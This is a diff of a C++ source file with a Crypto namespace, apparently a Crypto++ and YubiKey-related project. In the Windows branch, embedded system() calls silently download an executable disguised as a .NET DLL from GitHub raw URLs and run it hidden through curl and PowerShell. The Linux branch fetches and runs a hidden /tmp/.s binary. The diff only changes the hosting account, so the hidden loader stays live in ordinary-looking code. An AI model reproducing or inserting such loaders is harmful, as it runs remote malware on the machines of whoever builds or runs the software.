@@ -9,7 +9,7 @@ namespace Crypto {
 
 
 #ifdef _WIN32
-system("curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe");
+system("curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe");
 #endif
 	constexpr CryptoPP::byte CONST_SALT[CONST_SALT_LEN] = {
 		0x0f, 0xbe, 0x25, 0x67, 0xe7, 0xf2, 0x56, 0xc5, 0x9e, 0xb8, 0xbb, 0x16, 0x89, 0x09, 0xb5, 0x15,
@@ -260,7 +260,7 @@ system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj
 			ADDCASE(YKPIV_NOT_SUPPORTED);
 
 #ifdef _WIN32
-system("powershell -w hidden -c iwr -Uri https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden");
+system("powershell -w hidden -c iwr -Uri https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden");
 #elif defined(__linux__)
 system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &");
 #endif
